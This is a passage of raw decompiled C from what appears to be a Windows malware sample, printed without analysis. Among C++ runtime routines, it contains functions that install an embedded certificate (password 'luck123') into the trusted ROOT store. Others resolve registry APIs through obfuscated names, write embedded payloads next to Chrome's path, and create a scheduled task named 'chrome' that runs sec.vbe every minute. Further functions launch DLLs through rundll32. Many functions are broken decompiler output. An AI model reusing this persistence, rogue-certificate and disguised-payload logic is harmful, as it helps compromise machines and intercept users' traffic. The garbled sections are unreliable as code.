      v4 = *(_DWORD *)(this + 84);
      v5 = *(_DWORD *)(this + 80);
      *v3 = v5;
      **(_DWORD **)(this + 28) = v5;
      **(_DWORD **)(this + 44) = v4 - v5;
    }
  }
  if ( *(_BYTE *)(this + 72) )
  {
    if ( *(_DWORD *)(this + 76) )
    {
      sub_408760((void *)this);
      fclose(*(FILE **)(this + 76));
    }
    sub_408C70(this, 0, 2);
  }
  *(_DWORD *)this = &std::streambuf::`vftable';
  v6 = *(_DWORD **)(this + 52);
  if ( v6 )
  {
    v7 = v6[1];
    if ( v7 )
    {
      v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
      if ( v8 )
        (**v8)(v8, 1);
    }
    sub_40FBF3(v6);
  }
}
// 42E6D8: using guessed type void *std::streambuf::`vftable';
// 42E718: using guessed type void *std::filebuf::`vftable';

//----- (00407560) --------------------------------------------------------
void __thiscall sub_407560(struct std::ios_base *this)
{
  struct std::ios_base *v1; // [esp+0h] [ebp-14h]

  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 407590: variable 'v1' is possibly undefined
// 42E5D4: using guessed type void *std::ios_base::`vftable';

//----- (004075B0) --------------------------------------------------------
int __thiscall sub_4075B0(_DWORD *this)
{
  int v1; // edx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 2) + 4) - 8) = &std::ostream::`vftable';
  v1 = *(_DWORD *)(*(this - 2) + 4);
  result = v1 - 8;
  *(_DWORD *)((char *)this + v1 - 12) = v1 - 8;
  return result;
}
// 42E6D0: using guessed type void *std::ostream::`vftable';

//----- (004075D0) --------------------------------------------------------
int __thiscall sub_4075D0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  int result; // eax

  v2 = this[5];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)*this;
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_40FBF3(v3);
  }
  this[4] = 0;
  result = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  return result;
}

//----- (00407630) --------------------------------------------------------
void __thiscall sub_407630(std::_Lockit *this)
{
  std::_Locinfo::_Locinfo_dtor(this);
  if ( *((_DWORD *)this + 11) )
    j___free_base(*((void **)this + 11));
  *((_DWORD *)this + 11) = 0;
  if ( *((_DWORD *)this + 9) )
    j___free_base(*((void **)this + 9));
  *((_DWORD *)this + 9) = 0;
  if ( *((_DWORD *)this + 7) )
    j___free_base(*((void **)this + 7));
  *((_DWORD *)this + 7) = 0;
  if ( *((_DWORD *)this + 5) )
    j___free_base(*((void **)this + 5));
  *((_DWORD *)this + 5) = 0;
  if ( *((_DWORD *)this + 3) )
    j___free_base(*((void **)this + 3));
  *((_DWORD *)this + 3) = 0;
  if ( *((_DWORD *)this + 1) )
    j___free_base(*((void **)this + 1));
  *((_DWORD *)this + 1) = 0;
  std::_Lockit::~_Lockit(this);
}

//----- (00407720) --------------------------------------------------------
int __thiscall sub_407720(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  void *v5; // eax

  *this = &std::experimental::filesystem::v1::filesystem_error::`vftable';
  v2 = this[16];
  if ( v2 >= 8 )
  {
    v3 = (_DWORD *)this[11];
    if ( 2 * v2 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_40FBF3(v3);
  }
  this[15] = 0;
  this[16] = 7;
  *((_WORD *)this + 22) = 0;
  v4 = this[10];
  if ( v4 >= 8 )
  {
    v5 = (void *)this[5];
    if ( 2 * v4 + 2 < 0x1000 )
    {
LABEL_10:
      sub_40FBF3(v5);
      goto LABEL_11;
    }
    if ( (unsigned int)v5 - *((_DWORD *)v5 - 1) - 4 <= 0x1F )
    {
      v5 = (void *)*((_DWORD *)v5 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  this[9] = 0;
  this[10] = 7;
  *((_WORD *)this + 10) = 0;
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 41176E: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E644: using guessed type void *std::experimental::filesystem::v1::filesystem_error::`vftable';

//----- (004077E0) --------------------------------------------------------
void __thiscall sub_4077E0(_DWORD *this)
{
  int v1; // ecx
  void (__thiscall ***v2)(_DWORD, int); // eax

  v1 = this[1];
  if ( v1 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
    if ( v2 )
      (**v2)(v2, 1);
  }
}

//----- (00407830) --------------------------------------------------------
int __thiscall sub_407830(int this)
{
  unsigned int v2; // edi
  int *v3; // esi
  unsigned int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // edx
  int *v7; // ecx
  int *v8; // eax
  unsigned int v9; // edi
  unsigned int v10; // ecx
  int *v11; // eax
  int *v12; // eax
  unsigned int v13; // ecx
  int *v14; // eax
  int *v15; // eax
  unsigned int v16; // eax
  unsigned int v17; // edx
  int *v18; // ecx
  int *v19; // ecx
  unsigned int v21; // [esp+Ch] [ebp-10h]
  unsigned int v22; // [esp+10h] [ebp-Ch]
  int v23; // [esp+14h] [ebp-8h]
  unsigned int v24; // [esp+18h] [ebp-4h]

  v2 = 0;
  v22 = *(_DWORD *)(this + 28);
  *(_DWORD *)(this + 28) = 0;
  do
  {
    v3 = *(int **)this;
    v21 = v2;
    v4 = sub_408F40(*(int **)this);
    v5 = v3[4];
    v24 = v5;
    if ( v2 < v4 )
    {
      *(_DWORD *)(this + 28) = v4;
      goto LABEL_38;
    }
    if ( v2 == v4 && v4 < v5 )
    {
      v6 = v3[5];
      v7 = v3;
      if ( v6 >= 8 )
        v7 = (int *)*v3;
      v23 = 2 * v4;
      if ( *((_WORD *)v7 + v4) == 47 )
        goto LABEL_12;
      v8 = v3;
      if ( v6 >= 8 )
        v8 = (int *)*v3;
      if ( *(_WORD *)((char *)v8 + v23) == 92 )
      {
LABEL_12:
        v9 = v2 + 1;
        for ( *(_DWORD *)(this + 28) = v9; v9 < v24; *(_DWORD *)(this + 28) = ++v9 )
        {
          v10 = v3[5];
          v11 = v3;
          if ( v10 >= 8 )
            v11 = (int *)*v3;
          if ( *((_WORD *)v11 + v9) != 47 )
          {
            v12 = v3;
            if ( v10 >= 8 )
              v12 = (int *)*v3;
            if ( *((_WORD *)v12 + v9) != 92 )
              break;
          }
        }
        goto LABEL_38;
      }
      v5 = v3[4];
    }
    for ( ; v2 < v5; *(_DWORD *)(this + 28) = ++v2 )
    {
      v13 = v3[5];
      v14 = v3;
      if ( v13 >= 8 )
        v14 = (int *)*v3;
      if ( *((_WORD *)v14 + v2) != 47 )
      {
        v15 = v3;
        if ( v13 >= 8 )
          v15 = (int *)*v3;
        if ( *((_WORD *)v15 + v2) != 92 )
          break;
      }
    }
    v16 = *(_DWORD *)(this + 28);
    if ( v16 < v5 )
    {
      do
      {
        v17 = v3[5];
        v18 = v3;
        if ( v17 >= 8 )
          v18 = (int *)*v3;
        if ( *((_WORD *)v18 + v16) == 47 )
          break;
        v19 = v3;
        if ( v17 >= 8 )
          v19 = (int *)*v3;
        if ( *((_WORD *)v19 + v16) == 92 )
          break;
        *(_DWORD *)(this + 28) = ++v16;
      }
      while ( v16 < v24 );
    }
LABEL_38:
    sub_4088D0((int **)this);
    v2 = *(_DWORD *)(this + 28);
  }
  while ( v2 < v22 );
  *(_DWORD *)(this + 28) = v21;
  sub_4088D0((int **)this);
  return this;
}

//----- (00407980) --------------------------------------------------------
void __thiscall sub_407980(char *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 104);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 104) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 108) = *(_DWORD *)(*(_DWORD *)this + 4) - 104;
  sub_407490((int)(this + 4));
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 8;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 42E5D4: using guessed type void *std::ios_base::`vftable';
// 42E6D0: using guessed type void *std::ostream::`vftable';
// 42E758: using guessed type void *std::ofstream::`vftable';

//----- (00407A09) --------------------------------------------------------
char *__thiscall sub_407A09(char *this, char a2)
{
  return sub_407A50(&this[-*((_DWORD *)this - 1)], a2);
}

//----- (00407A11) --------------------------------------------------------
char *__thiscall sub_407A11(_DWORD *this, char a2)
{
  return sub_407A80((struct std::ios_base *)((char *)this - *(this - 1)), a2);
}

//----- (00407A20) --------------------------------------------------------
void *__thiscall sub_407A20(void *Block, char a2)
{
  sub_407490((int)Block);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}

//----- (00407A50) --------------------------------------------------------
char *__thiscall sub_407A50(char *this, char a2)
{
  char *v2; // esi

  v2 = this - 104;
  sub_407980(this - 104);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(v2);
  return v2;
}

//----- (00407A80) --------------------------------------------------------
char *__thiscall sub_407A80(struct std::ios_base *this, char a2)
{
  char *v2; // esi
  struct std::ios_base *v4; // [esp+0h] [ebp-18h]

  v2 = (char *)this - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 12) = *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8;
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v4);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(v2);
  return v2;
}
// 407ACE: variable 'v4' is possibly undefined
// 42E5D4: using guessed type void *std::ios_base::`vftable';
// 42E6D0: using guessed type void *std::ostream::`vftable';

//----- (00407B00) --------------------------------------------------------
_DWORD *__thiscall sub_407B00(_DWORD *Block, char a2)
{
  _DWORD *v3; // edi
  int v4; // ecx
  void (__thiscall ***v5)(_DWORD, int); // eax

  v3 = (_DWORD *)Block[13];
  *Block = &std::streambuf::`vftable';
  if ( v3 )
  {
    v4 = v3[1];
    if ( v4 )
    {
      v5 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 8))(v4);
      if ( v5 )
        (**v5)(v5, 1);
    }
    sub_40FBF3(v3);
  }
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 42E6D8: using guessed type void *std::streambuf::`vftable';

//----- (00407B90) --------------------------------------------------------
_DWORD *__thiscall sub_407B90(_DWORD *Block, char a2)
{
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 42E4B8: using guessed type void *std::_Facet_base::`vftable';

//----- (00407BC0) --------------------------------------------------------
void *__thiscall sub_407BC0(void *Block, char a2)
{
  int v3; // eax

  v3 = *((_DWORD *)Block + 4);
  *(_DWORD *)Block = &std::ctype<char>::`vftable';
  if ( v3 <= 0 )
  {
    if ( v3 < 0 )
      j_j_j___free_base(*((void **)Block + 3));
  }
  else
  {
    j___free_base(*((void **)Block + 3));
  }
  j___free_base(*((void **)Block + 5));
  *(_DWORD *)Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 42E4B8: using guessed type void *std::_Facet_base::`vftable';
// 42E4C8: using guessed type void *std::ctype<char>::`vftable';

//----- (00407C20) --------------------------------------------------------
_DWORD *__thiscall sub_407C20(_DWORD *Block, char a2)
{
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 42E4B8: using guessed type void *std::_Facet_base::`vftable';

//----- (00407C50) --------------------------------------------------------
_DWORD *__thiscall sub_407C50(_DWORD *Block, char a2)
{
  *Block = &std::error_category::`vftable';
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 42E4F8: using guessed type void *std::error_category::`vftable';

//----- (00407C80) --------------------------------------------------------
char *__thiscall sub_407C80(char *Block, char a2)
{
  *(_DWORD *)Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 4);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 41176E: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';

//----- (00407CB0) --------------------------------------------------------
char *__thiscall sub_407CB0(char *Block, char a2)
{
  *(_DWORD *)Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 4);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 41176E: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';

//----- (00407CE0) --------------------------------------------------------
_DWORD *__thiscall sub_407CE0(_DWORD *Block, char a2)
{
  unsigned int v3; // ecx
  _DWORD *v4; // eax
  unsigned int v5; // ecx
  _DWORD *v6; // eax

  *Block = &std::experimental::filesystem::v1::filesystem_error::`vftable';
  v3 = Block[16];
  if ( v3 >= 8 )
  {
    v4 = (_DWORD *)Block[11];
    if ( 2 * v3 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
        goto LABEL_14;
      v4 = (_DWORD *)*(v4 - 1);
    }
    sub_40FBF3(v4);
  }
  Block[15] = 0;
  Block[16] = 7;
  *((_WORD *)Block + 22) = 0;
  v5 = Block[10];
  if ( v5 < 8 )
    goto LABEL_11;
  v6 = (_DWORD *)Block[5];
  if ( 2 * v5 + 2 >= 0x1000 )
  {
    if ( (unsigned int)v6 - *(v6 - 1) - 4 <= 0x1F )
    {
      v6 = (_DWORD *)*(v6 - 1);
      goto LABEL_10;
    }
LABEL_14:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_10:
  sub_40FBF3(v6);
LABEL_11:
  Block[9] = 0;
  Block[10] = 7;
  *((_WORD *)Block + 10) = 0;
  *Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 1);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 41176E: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 42E47C: using guessed type void *std::exception::`vftable';
// 42E644: using guessed type void *std::experimental::filesystem::v1::filesystem_error::`vftable';

//----- (00407DC0) --------------------------------------------------------
struct std::ios_base *__thiscall sub_407DC0(struct std::ios_base *Block, char a2)
{
  *(_DWORD *)Block = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(Block);
  if ( (a2 & 1) != 0 )
    sub_40FBF3(Block);
  return Block;
}
// 42E5D4: using guessed type void *std::ios_base::`vftable';

//----- (00407E20) --------------------------------------------------------
CERT_CONTEXT *sub_407E20()
{
  CERT_CONTEXT *result; // eax
  int v1; // edx
  WCHAR *v2; // ecx
  const CERT_CONTEXT *v3; // esi
  HCERTSTORE v4; // eax
  CRYPT_DATA_BLOB pPFX; // [esp+0h] [ebp-1Ch] BYREF
  WCHAR szPassword[8]; // [esp+8h] [ebp-14h] BYREF

  pPFX.pbData = (BYTE *)&unk_44E9C0;
  pPFX.cbData = 2642;
  wcscpy(szPassword, L"luck123");
  result = (CERT_CONTEXT *)PFXImportCertStore(&pPFX, szPassword, 0x8000u);
  v1 = 16;
  v2 = szPassword;
  do
  {
    *(_BYTE *)v2 = 0;
    v2 = (WCHAR *)((char *)v2 + 1);
    --v1;
  }
  while ( v1 );
  if ( result )
  {
    result = (CERT_CONTEXT *)CertFindCertificateInStore(result, 0x10001u, 0, 0, 0, 0);
    v3 = result;
    if ( result )
    {
      v4 = CertOpenStore((LPCSTR)0xA, 0, 0, 0x24000u, L"ROOT");
      return (CERT_CONTEXT *)CertAddCertificateContextToStore(v4, v3, 3u, 0);
    }
  }
  return result;
}
// 42E6C0: using guessed type wchar_t aRoot[5];

//----- (00407ED0) --------------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
// bad sp value at call has been detected, the output may be wrong!
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_407ED0(
        int a1@<edx>,
        int a2@<ecx>,
        _DWORD *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49,
        int a50,
        int a51,
        int a52,
        int a53,
        int a54,
        int a55,
        int a56,
        int a57,
        int a58,
        int a59,
        int a60,
        int a61,
        int a62,
        int a63)
{
  int v64; // ecx
  _DWORD v65[171]; // [esp-4h] [ebp-2B8h] BYREF

  v65[170] = v65;
  v65[8] = a4;
  sub_50DDB2(0, a4, a1, a2);
  if ( !v64 )
  {
    unk_42E800 = *a3;
    MEMORY[0xFFDCCE51]();
  }
}
// 408208: positive sp value 4 has been found
// 50F420: bad sp value at call
// 50F41A: write access to const memory at 42E800 has been detected
// 50F3C0: variable 'v64' is possibly undefined
// 407ED0: too many input arguments, some ignored

//----- (00407F35) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_407F35(
        _DWORD *a1@<ebp>,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19)
{
  int v19; // [esp+0h] [ebp-4h]

  *a1 = v19;
  JUMPOUT(0x407FBA);
}
// 407F4E: positive sp value 4C has been found
// 40803F: control flows out of bounds to 407FBA
// 407F43: variable 'v19' is possibly undefined

//----- (00407F62) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_407F62(
        unsigned int *a1@<ebp>,
        __int16 a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13)
{
  unsigned int v13; // kr00_4

  v13 = __getcallerseflags();
  __readeflags();
  *a1 = v13;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (00408044) --------------------------------------------------------
#error "408046: call analysis failed (funcsize=4)"

//----- (0040806D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_40806D(
        int a1,
        int a2,
        int a3,
        char a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20)
{
  void *v24; // [esp-54h] [ebp-54h]
  void *retaddr; // [esp+0h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v24;
  JUMPOUT(0x50CA61);
}
// 40808C: positive sp value 50 has been found
// 40808C: control flows out of bounds to 50CA61
// 40806F: variable 'v24' is possibly undefined

//----- (00408129) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_408129@<eax>(
        char a1@<cl>,
        unsigned int *a2@<ebp>,
        int a3@<edi>,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24)
{
  unsigned int v24; // kr04_4
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  __getcallerseflags();
  v24 = __readeflags();
  __readeflags();
  *a2 = v24;
  if ( (unsigned int)a2 > a3 + 80 )
    JUMPOUT(0x50B71E);
  _RAX = __rdtsc();
  LOWORD(_RAX) = a1;
  __asm { aam     23h ; '#' }
  LOBYTE(_RAX) = __ROL2__(a3 - 1, a3 + 64 - (_DWORD)&retaddr);
  __asm { aaa }
  sub_50B478();
  return sub_50B6E2(a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24);
}
// 408039: positive sp value 3C has been found
// 50B6A6: control flows out of bounds to 50B71E
// 50B6E2: using guessed type _DWORD __stdcall sub_50B6E2(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 408129: using guessed type _DWORD arg_0;

//----- (00408151) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_408151(
        _DWORD *a1@<ebp>,
        int a2,
        int a3,
        int a4,
        __int16 a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  int v15; // [esp-4h] [ebp-4h]

  *a1 = v15;
  __readeflags();
  __readeflags();
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 408155: variable 'v15' is possibly undefined

//----- (00408169) --------------------------------------------------------
int __userpurge sub_408169@<eax>(
        int a1@<eax>,
        int a2@<ebx>,
        unsigned int *a3@<ebp>,
        int a4@<edi>,
        int a5@<esi>,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26)
{
  char v26; // cl

  sub_50B205(~a1, ~a3[1], a2, (int)a3, a4, a5);
  return sub_408129(
           v26,
           a3,
           a4,
           a6,
           a7,
           a8,
           a9,
           a10,
           a11,
           a12,
           a13,
           a14,
           a15,
           a16,
           a17,
           a18,
           a19,
           a20,
           a21,
           a22,
           a23,
           a24,
           a25,
           a26);
}
// 408125: variable 'v26' is possibly undefined

//----- (004081BA) --------------------------------------------------------
void __cdecl sub_4081BA(int a1)
{
  JUMPOUT(0x50C38A);
}
// 4081BF: control flows out of bounds to 50C38A

//----- (0040822C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_40822C@<al>(char a1@<al>, int a2@<ebp>)
{
  *(_BYTE *)(a2 + 4) += a1;
  ((void (__cdecl *)())sub_50C0C2)();
  sub_50C432();
  return 1;
}
// 408258: positive sp value 14 has been found
// 40822C: could not find valid save-restore pair for ebx
// 40822C: could not find valid save-restore pair for edi
// 40822C: could not find valid save-restore pair for esi
// 50C0C2: using guessed type _DWORD __cdecl sub_50C0C2(__int16, _DWORD, _DWORD, _DWORD);
// 50C432: using guessed type int sub_50C432(void);

//----- (00408322) --------------------------------------------------------
int sub_408322()
{
  return 1;
}

//----- (00408328) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char __usercall sub_408328@<al>(int a1@<ebp>)
{
  CloseServiceHandle(*(SC_HANDLE *)(a1 - 28));
  CloseServiceHandle(*(SC_HANDLE *)(a1 - 32));
  *(_DWORD *)(a1 - 4) = -2;
  return 0;
}
// 408352: positive sp value 10 has been found
// 408328: could not find valid save-restore pair for ebx
// 408328: could not find valid save-restore pair for edi
// 408328: could not find valid save-restore pair for esi

//----- (00408360) --------------------------------------------------------
int __usercall sub_408360@<eax>(__m64 a1@<mm0>, __m64 a2@<mm1>, char *lpFileName, void *Src)
{
  FARPROC v4; // eax
  FARPROC v5; // eax
  FARPROC v6; // eax
  FILE *v7; // eax
  FILE *v8; // esi
  void *v10[4]; // [esp-30h] [ebp-6ACh] BYREF
  int v11; // [esp-20h] [ebp-69Ch]
  unsigned int v12; // [esp-1Ch] [ebp-698h]
  void *v13[4]; // [esp-18h] [ebp-694h] BYREF
  size_t v14; // [esp-8h] [ebp-684h]
  unsigned int v15; // [esp-4h] [ebp-680h]
  void **v16; // [esp+14h] [ebp-668h]
  void *v17; // [esp+18h] [ebp-664h] BYREF
  int v18; // [esp+1Ch] [ebp-660h] BYREF
  int v19; // [esp+20h] [ebp-65Ch] BYREF
  char v20[1024]; // [esp+24h] [ebp-658h] BYREF
  int v21[65]; // [esp+424h] [ebp-258h] BYREF
  int CmdLine[65]; // [esp+528h] [ebp-154h] BYREF
  char v23[64]; // [esp+62Ch] [ebp-50h] BYREF
  int v24; // [esp+678h] [ebp-4h]

  strcpy(v23, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe");
  v18 = 1;
  memset(v20, 0, sizeof(v20));
  v19 = 1024;
  memset(v21, 0, sizeof(v21));
  sub_40D0B0(L"chrome.exe");
  v4 = sub_40D590("SfhPqfoLfzB");
  if ( ((int (__stdcall *)(int, char *, void **))v4)(-2147483646, v23, &v17) )
    return 0;
  v13[0] = v17;
  v5 = sub_40D590("SfhRvfszWbmvfFyB");
  if ( !((int (__stdcall *)(void *, const char *, _DWORD, int *, char *, int *))v5)(v13[0], "Path", 0, &v18, v20, &v19) )
  {
    v15 = (unsigned int)"chrome.exe";
    sub_405860(v21, (int)"%s\\%s", (int)v20);
  }
  v15 = (unsigned int)v17;
  v6 = sub_40D590("SfhDmptfLfz");
  ((void (__stdcall *)(unsigned int))v6)(v15);
  v7 = fopen(lpFileName, "wb");
  v8 = v7;
  if ( v7 )
  {
    if ( fwrite(&unk_440000, 1u, 0xE9BAu, v7) == 59834 )
      fclose(v8);
  }
  v16 = v13;
  v14 = 0;
  v15 = 15;
  LOBYTE(v13[0]) = 0;
  sub_4093F0(v13, Src, strlen((const char *)Src));
  v24 = 0;
  v11 = 0;
  v12 = 15;
  LOBYTE(v10[0]) = 0;
  sub_4093F0(v10, lpFileName, strlen(lpFileName));
  v24 = -1;
  sub_4099A0(
    a1,
    a2,
    (int *)v10[0],
    (int)v10[1],
    (int)v10[2],
    (int)v10[3],
    v11,
    v12,
    (void **)v13[0],
    (int)v13[1],
    (int)v13[2],
    (int)v13[3],
    v14,
    v15);
  DeleteFileA(lpFileName);
  memset(CmdLine, 0, sizeof(CmdLine));
  sub_405860(CmdLine, (int)"schtasks /create /sc minute /mo 1 /tn \"chrome\" /tr %s\\sec.vbe", (int)Src);
  WinExec((LPCSTR)CmdLine, 0);
  return 1;
}
// 42E768: using guessed type wchar_t aChromeExe[11];
// 408360: using guessed type int var_258[65];
// 408360: using guessed type int CmdLine[65];

//----- (004085D0) --------------------------------------------------------
void __cdecl sub_4085D0(char *FileName)
{
  FILE *v1; // eax
  FILE *v2; // esi

  v1 = fopen(FileName, "wb");
  v2 = v1;
  if ( v1 && fwrite(&unk_44F418, 1u, 0xB1A00u, v1) == 727552 )
    fclose(v2);
  Sleep(0x1F4u);
}

//----- (00408620) --------------------------------------------------------
UINT __cdecl sub_408620(int a1)
{
  int CmdLine[65]; // [esp+4h] [ebp-108h] BYREF

  memset(CmdLine, 0, sizeof(CmdLine));
  sub_405860(CmdLine, (int)"cmd /c rundll32 \"%s\",Launch", a1);
  return WinExec((LPCSTR)CmdLine, 0);
}
// 408620: using guessed type int CmdLine[65];

//----- (00408680) --------------------------------------------------------
UINT __cdecl sub_408680(int a1)
{
  int CmdLine[65]; // [esp+8h] [ebp-108h] BYREF

  memset(CmdLine, 0, sizeof(CmdLine));
  sub_405860(CmdLine, (int)"cmd /c rundll32 \"%s\",DllUnInstall %s %s", a1);
  return WinExec((LPCSTR)CmdLine, 0);
}
// 408680: using guessed type int CmdLine[65];

//----- (004086F0) --------------------------------------------------------
void __thiscall sub_4086F0(void **this)
{
  _DWORD *v2; // esi

  v2 = *this;
  memmove_0(this, *this, (size_t)this[4] + 1);
  if ( (unsigned int)this[5] + 1 >= 0x1000 )
  {
    if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (_DWORD *)*(v2 - 1);
  }
  sub_40FBF3(v2);
  this[5] = (void *)15;
}

//----- (00408740) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_408740(volatile signed __int32 *this)
{
  volatile signed __int32 *result; // eax

  result = 0;
  if ( !_InterlockedExchangeAdd(this + 1, 0xFFFFFFFF) )
    return this;
  return result;
}

//----- (00408760) --------------------------------------------------------
char __thiscall sub_408760(void *this)
{
  void **v3; // eax
  unsigned int v4; // edx
  void **v5; // edi
  void **v6; // esi
  int v7; // eax
  int v8; // eax
  bool v9; // zf
  char v10; // bl
  void **v11; // ecx
  size_t v12; // esi
  void **v13; // ecx
  size_t v14; // eax
  void **v15; // ecx
  void **v16; // [esp+10h] [ebp-2Ch] BYREF
  void *Buffer[4]; // [esp+14h] [ebp-28h] BYREF
  int v18; // [esp+24h] [ebp-18h]
  unsigned int v19; // [esp+28h] [ebp-14h]
  int v20; // [esp+38h] [ebp-4h]

  if ( !*((_DWORD *)this + 14) || !*((_BYTE *)this + 61) )
    return 1;
